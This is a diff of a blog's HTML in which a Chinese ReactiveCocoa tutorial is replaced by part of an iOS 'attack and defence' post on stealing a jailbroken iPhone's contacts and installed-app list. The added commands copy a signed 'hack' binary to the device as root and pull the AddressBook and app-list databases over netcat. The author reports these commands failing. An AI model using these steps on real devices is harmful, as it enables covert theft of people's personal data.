-<figure class="highlight objc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">RAC(<span class="keyword">self</span>.label, text) = [RACObserve(<span class="keyword">self</span>.user, username) distinctUntilChanged];</span><br><span class="line"><span class="keyword">self</span>.user.username = <span class="string">@"sunnyxx"</span>; <span class="comment">// 1st</span></span><br><span class="line"><span class="keyword">self</span>.user.username = <span class="string">@"sunnyxx"</span>; <span class="comment">// 2nd</span></span><br><span class="line"><span class="keyword">self</span>.user.username = <span class="string">@"sunnyxx"</span>; <span class="comment">// 3rd</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ldid -S hack</span><br><span class="line">scp hack root@192.168.1.60:/usr/bin/hack</span><br></pre></td></tr></table></figure>
 <ul>
-<li>如果不增加<code>distinctUntilChanged</code>的话对于连续的相同的输入值就会有不必要的处理，这个栗子只是简单的UI刷新，但遇到如写数据库，发网络请求的情况时，代价就不能购忽略了。</li>
-<li>所以，对于相同值可以忽略的情况，果断加上它吧。</li>
+<li>新开一个终端，SSH连接电脑。</li>
 </ul>
-</li>
-<li><p>起止点过滤类型</p>
+<h2 id="获取AddressBook-amp-用户安装App列表数据"><a href="#获取AddressBook-amp-用户安装App列表数据" class="headerlink" title="获取AddressBook &amp; 用户安装App列表数据"></a>获取AddressBook &amp; 用户安装App列表数据</h2><ul>
+<li>利用<code>netcat</code>，将指定服务端口的数据以文件的形式传输到电脑的当前目录下，抓取设备 <code>AddressBook</code> 或者 用户安装App列表信息。</li>
+<li><code>55</code>为之前plist文件配置的Socket服务名称。</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// 根据自己可执行程序路径，选择获取的数据类型</span><br><span class="line">nc 192.168.1.60 55 &gt; addressBook.sqlitedb  // 通讯录</span><br><span class="line">nc 192.168.1.60 55 &gt; itunesstored2.sqlitedb // App列表</span><br></pre></td></tr></table></figure>
 <ul>
-<li>除了被动的当next值来的时候做判断，也可以主动的提前选择开始和结束条件，分为两种类型：<ul>
-<li><code>take</code>型（取）</li>
-<li><code>skip</code>型(跳)</li>
+<li>利用<code>netcat</code>获取的<code>addressBook.sqlitedb</code>是空的。</li>
+<li>使用如下指令监控下过程提示连接拒绝，但是<code>192.168.1.60</code>是可以<code>ping</code>通的。</li>
+<li>使用<code>ps aux</code>指令查看所有启动的进程，貌似没有找到我们的<code>hack</code>进程。<ul>
+<li>暂时还没有找到解决方法，大家可以一起帮忙排查原因。</li>
 </ul>
 </li>
 </ul>
-</li>
-<li><p><code>take:(NSUInteger)</code> : 从开始一共取N次的next值，不包括<code>Competion</code>和<code>Error</code>，如：</p>
-<figure class="highlight objc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[[[RACSignal createSignal:^RACDisposable *(<span class="keyword">id</span>&lt;RACSubscriber&gt; subscriber) &#123;</span><br><span class="line">[subscriber sendNext:<span class="string">@"1"</span>];</span><br><span class="line">[subscriber sendNext:<span class="string">@"2"</span>];</span><br><span class="line">[subscriber sendNext:<span class="string">@"3"</span>];</span><br><span class="line">[subscriber sendCompleted];</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>;</span><br><span class="line">&#125;] take:<span class="number">2</span>] subscribeNext:^(<span class="keyword">id</span> x) &#123;</span><br><span class="line"><span class="built_in">NSLog</span>(<span class="string">@"only 1 and 2 will be print: %@"</span>, x);</span><br><span class="line">&#125;];</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><code>takeLast:(NSUInteger)</code> : 取最后N次的next值</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -v 192.168.1.60 55</span><br><span class="line">// nc: connectx to 192.168.1.60 port 55 (tcp) failed: Connection refused</span><br></pre></td></tr></table></figure>
+<center><img src="/uploads/assets/hack_appList_result_failed.png" alt="hack_appList_result_failed"></center>
+
+
 <ul>
-<li>注意，由于一开始不能知道这个Signal将有多少个next值，所以RAC实现它的方法是将所有next值都存起来，然后原Signal完成时再将后N个依次发送给接收者</li>
-<li>但Error发生时依然是立刻发送的</li>
+<li>如果文件有数据，可以使用<code>string</code>命令查看文件内容</li>
 </ul>
-</li>
-<li><p><code>takeUntil:(RACSignal *)</code> : 当给定的signal完成前一直取值, 也就是这个Signal一直到textField执行dealloc时才停止。最简单的栗子就是UITextField的rac_textSignal的实现（删减版本）:</p>
-<figure class="highlight objc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">- (RACSignal *)rac_textSignal &#123;</span><br><span class="line">@weakify(<span class="keyword">self</span>);</span><br><span class="line"><span class="keyword">return</span> [[[[[RACSignal</span><br><span class="line">    concat:[<span class="keyword">self</span> rac_signalForControlEvents:<span class="built_in">UIControlEventEditingChanged</span>]]</span><br><span class="line">    map:^(<span class="built_in">UITextField</span> *x) &#123;</span><br><span class="line">        <span class="keyword">return</span> x.text;</span><br><span class="line">    &#125;]</span><br><span class="line">    takeUntil:<span class="keyword">self</span>.rac_willDeallocSignal] <span class="comment">// bingo!</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><code>takeUntilBlock:(BOOL(^)(id x))</code> : 对于每个next值，运行block，当block返回YES时停止取值，如：</p>
-<figure class="highlight objc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[[<span class="keyword">self</span>.inputTextField.rac_textSignal takeUntilBlock:^<span class="built_in">BOOL</span>(<span class="built_in">NSString</span> *value) &#123;</span><br><span class="line"><span class="keyword">return</span> [value isEqualToString:<span class="string">@"stop"</span>];</span><br><span class="line">&#125;] subscribeNext:^(<span class="built_in">NSString</span> *value) &#123;</span><br><span class="line"><span class="built_in">NSLog</span>(<span class="string">@"current value is not `stop`: %@"</span>, value);</span><br><span class="line">&#125;];</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><code>takeWhileBlock:(BOOL(^)(id x))</code> : 上面的反向逻辑，对于每个next值，block返回 YES时才取值</p>
-</li>
-<li><p><code>skip:(NSUInteger)</code> : 从开始跳过N次的next值，简单的栗子：</p>
-<figure class="highlight objc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[[[RACSignal createSignal:^RACDisposable *(<span class="keyword">id</span>&lt;RACSubscriber&gt; subscriber) &#123;</span><br><span class="line">[subscriber sendNext:<span class="string">@"1"</span>];</span><br><span class="line">[subscriber sendNext:<span class="string">@"2"</span>];</span><br><span class="line">[subscriber sendNext:<span class="string">@"3"</span>];</span><br><span class="line">[subscriber sendCompleted];</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>;</span><br><span class="line">&#125;] skip:<span class="number">1</span>] subscribeNext:^(<span class="keyword">id</span> x) &#123;</span><br><span class="line"><span class="built_in">NSLog</span>(<span class="string">@"only 2 and 3 will be print: %@"</span>, x);</span><br><span class="line">&#125;];</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><code>skipUntilBlock:(BOOL(^)(id x))</code> : 和- takeUntilBlock:同理，一直跳，直到block为YES</p>
-</li>
-<li><code>skipWhileBlock:\(BOOL(^)(id x))</code> : 和- takeWhileBlock:同理，一直跳，直到block为NO</li>
-<li><p><code>merge</code> : 合并信号，只要有一个信号变化就会调用</p>
-<figure class="highlight objc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">@weakify(<span class="keyword">self</span>); </span><br><span class="line">[[RACSignal merge: @[RACObserve(<span class="keyword">self</span>.viewModel, tweets),</span><br><span class="line">RACObserve(<span class="keyword">self</span>.viewModel, allTweetsLoaded)]]</span><br><span class="line">bufferWithTime: <span class="number">0</span> onScheduler: [RACScheduler mainThreadScheduler]]</span><br><span class="line">subscribeNext: ^(<span class="keyword">id</span> value) &#123;</span><br><span class="line">@strongify(<span class="keyword">self</span>);</span><br><span class="line">[<span class="keyword">self</span>.tableView reloadData];</span><br><span class="line">&#125;];</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><code>combineLatest</code> : 将多个信号合并起来，并且拿到各个信号的最新的值,必须每个合并的signal至少都有过一次sendNext，才会触发合并的信号</p>
-<ul>
-<li><p>根据组合的信号的值再转换生成判断条件</p>
-<figure class="highlight objc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">RACSignal *signupActiveSignal = [RACSignal combineLatest:@[validUsernameSignal,</span><br><span class="line">validPwdSignal] reduce:^<span class="keyword">id</span>(<span class="built_in">NSNumber</span> *usernameValid, <span class="built_in">NSNumber</span> *passwordValid) &#123;</span><br><span class="line"><span class="keyword">return</span> @(usernameValid.boolValue &amp;&amp; passwordValid.boolValue);</span><br><span class="line">&#125;];</span><br><span class="line">[signupActiveSignal subscribeNext:^(<span class="built_in">NSNumber</span> *state) &#123;</span><br><span class="line"><span class="keyword">self</span>.signInButton.enabled = state.boolValue;</span><br><span class="line">&#125;];</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-</li>
-<li><p><code>doNext</code>: 注意doNext:并不返回一个值，因为它是附加操作。它完成时不改变事件。</p>
-</li>
-<li><code>concat</code>: 按一定顺序拼接信号，当多个信号发出的时候，有顺序的接收信号 （只需要订阅拼接的信号就可以了）</li>
-<li><code>then</code>: then方法会等到completed事件发出后调用，然后订阅由then:block参数返回的信号。这有效地将控制从一个信号传递给下一个信号</li>
-<li><p><code>zipWith</code>: 把两个信号压缩成一个信号，只有当两个信号同时发出信号内容时，并且把两个信号的内容合并成一个元组，才会触发压缩流的next事件</p>
-</li>
-<li><p><code>RACScheduler</code> : 是RAC里面对线程的简单封装，事件可以在指定的scheduler上分发和执行，</p>
-<ul>
-<li>不特殊指定的话，事件的分发和执行都在一个默认的后台线程里面做，大多数情况也就不用动了</li>
-<li>有一些特殊的signal必须在主线程调用，使用-deliverOn：可以切换调用的线程。</li>
-</ul>
-</li>
-<li><p><code>deliverOn</code>: 更新UI的时候回到主线程执行（子线程加载图片、主线程刷新UI）</p>
-<figure class="highlight objc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">deliverOn:[RACScheduler mainThreadScheduler]</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><code>chain</code> :</p>
-</li>
-<li><p><code>multicast</code> : 避免副作用，这两个订阅者接收到了同样的一个请求的内容</p>
-<figure class="highlight objc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Starts a single request, no matter how many subscriptions `connection.signal`</span></span><br><span class="line"><span class="comment">// gets. This is equivalent to the -replay operator, or similar to</span></span><br><span class="line"><span class="comment">// +startEagerlyWithScheduler:block:.</span></span><br><span class="line">RACMulticastConnection *connection = [networkRequest multicast:[RACReplaySubject subject]];</span><br><span class="line">[connection connect];</span><br><span class="line">[connection.signal subscribeNext:^(<span class="keyword">id</span> response) &#123;</span><br><span class="line"> <span class="built_in">NSLog</span>(<span class="string">@"subscriber one: %@"</span>, response);</span><br><span class="line">&#125;];</span><br><span class="line">[connection.signal subscribeNext:^(<span class="keyword">id</span> response) &#123;</span><br><span class="line"> <span class="built_in">NSLog</span>(<span class="string">@"subscriber two: %@"</span>, response);</span><br><span class="line">&#125;];</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><code>timeout</code> : 超时，可以让一个信号在一定的时间后，自动报错</p>
-</li>
-<li><code>interval</code> : 定时，每隔一段时间发出信号</li>
-<li><code>delay</code> : 延迟发送next</li>
-<li><code>retry重试</code> : 只要失败，就会重新执行创建信号中的block,直到成功</li>
-<li><p><code>replay重放</code> : 当一个信号被多次订阅,反复播放内容</p>
-</li>
-<li><p><code>throttle</code>节流 : 当某个信号发送比较频繁时，可以使用节流，在某一段时间不发送信号内容，过了一段时间获取信号的最新内容发出</p>
-<ul>
-<li>延时处理，只有在两次next事件间隔指定的时间时才会发送第二个next事件</li>
-</ul>
-</li>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings itunesstored2.sqlitedb</span><br></pre></td></tr></table></figure>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
+<li><a href="http://zhoulingyu.com/2016/07/12/iOS%E6%94%BB%E9%98%B2%E2%80%94%E2%80%94%EF%BC%88%E4%BA%8C%EF%BC%89%E5%A6%82%E4%BD%95%E7%AA%83%E5%8F%96%E7%94%A8%E6%88%B7%E7%9A%84%E9%80%9A%E8%AE%AF%E5%BD%95%E4%BF%A1%E6%81%AF/" target="_blank" rel="noopener">iOS攻防——（二）如何窃取用户的通讯录信息</a></li>
+<li><a href="https://blog.csdn.net/abby_sheen/article/details/7794531" target="_blank" rel="noopener">Mac OS启动服务</a></li>
+<li><a href="https://www.cnblogs.com/klcf0220/p/3611836.html" target="_blank" rel="noopener">守护进程和inetd超级服务器</a></li>
+<li><a href="https://blog.csdn.net/qq_21792169/article/details/51068796" target="_blank" rel="noopener">C语言之fileno()函数</a></li>
+<li><a href="https://blog.csdn.net/u012349696/article/details/51125106" target="_blank" rel="noopener">对stdin，stdout 和STDOUT_FILENO，STDIN_FILENO的学习</a></li>
+<li><a href="https://www.cnblogs.com/wenbiao/p/3375811.html" target="_blank" rel="noopener">nc命令详解</a></li>
 </ul>
 
       
@@ -692,7 +726,7 @@
   </li>
   <li class="post-copyright-link">
     <strong>本文链接：</strong>
-    <a href="https://sevencho.github.io/archives/48d913e0.html" title="iOS开发ReactiveCocoa（一）：介绍">https://sevencho.github.io/archives/48d913e0.html</a>
+    <a href="https://sevencho.github.io/archives/bf5c1be0.html" title="iOS攻防（二）：窃取用户的通讯录信息 & 偷窥用户安装应用列表 & Netcat使用">https://sevencho.github.io/archives/bf5c1be0.html</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>
@@ -709,7 +743,7 @@
           
             <a href="/tags/iOS/" rel="tag"><i class="fa fa-tag"></i> iOS</a>
           
-            <a href="/tags/RAC/" rel="tag"><i class="fa fa-tag"></i> RAC</a>
+            <a href="/tags/攻防/" rel="tag"><i class="fa fa-tag"></i> 攻防</a>
           
         </div>
       
@@ -722,8 +756,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/archives/fd0d6f33.html" rel="next" title="iOS开发中碎片知识整理">
-                <i class="fa fa-chevron-left"></i> iOS开发中碎片知识整理
+              <a href="/archives/e38331a.html" rel="next" title="iOS攻防（一）： iPhone手机越狱 & SSH">
+                <i class="fa fa-chevron-left"></i> iOS攻防（一）： iPhone手机越狱 & SSH
               </a>
             
           </div>
@@ -731,10 +765,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/archives/63f63348.html" rel="prev" title="iOS开发ReactiveCocoa（二）：RACCommand篇">
-                iOS开发ReactiveCocoa（二）：RACCommand篇 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -893,7 +923,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#ReactiveCocoa"><span class="nav-number">1.</span> <span class="nav-text">ReactiveCocoa</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Github上整合的比较全面的（MVVM、RAC）学习资料"><span class="nav-number">1.1.</span> <span class="nav-text">Github上整合的比较全面的（MVVM、RAC）学习资料</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#美团的几篇资料-（开发中可能遇到的坑）"><span class="nav-number">1.2.</span> <span class="nav-text">美团的几篇资料 （开发中可能遇到的坑）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#注意点"><span class="nav-number">1.3.</span> <span class="nav-text">注意点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#RAC-VS-原生"><span class="nav-number">1.4.</span> <span class="nav-text">RAC VS 原生</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#RAC提供的宏"><span class="nav-number">1.5.</span> <span class="nav-text">RAC提供的宏</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#常用知识点"><span class="nav-number">1.6.</span> <span class="nav-text">常用知识点</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#简介"><span class="nav-number">1.</span> <span class="nav-text">简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#了解一下OS-X的启动原理"><span class="nav-number">2.</span> <span class="nav-text">了解一下OS X的启动原理</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#几个目录下plist文件格式及每个字段的含义："><span class="nav-number">2.1.</span> <span class="nav-text">几个目录下plist文件格式及每个字段的含义：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#配置一个Hack通讯录进程的plist文件"><span class="nav-number">3.</span> <span class="nav-text">配置一个Hack通讯录进程的plist文件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#读取通讯录-amp-用户安装App列表-的执行程序"><span class="nav-number">4.</span> <span class="nav-text">读取通讯录 &amp; 用户安装App列表 的执行程序</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#获取AddressBook-amp-用户安装App列表数据"><span class="nav-number">5.</span> <span class="nav-text">获取AddressBook &amp; 用户安装App列表数据</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考"><span class="nav-number">6.</span> <span class="nav-text">参考</span></a></li></ol></div>
             
 
           </div>
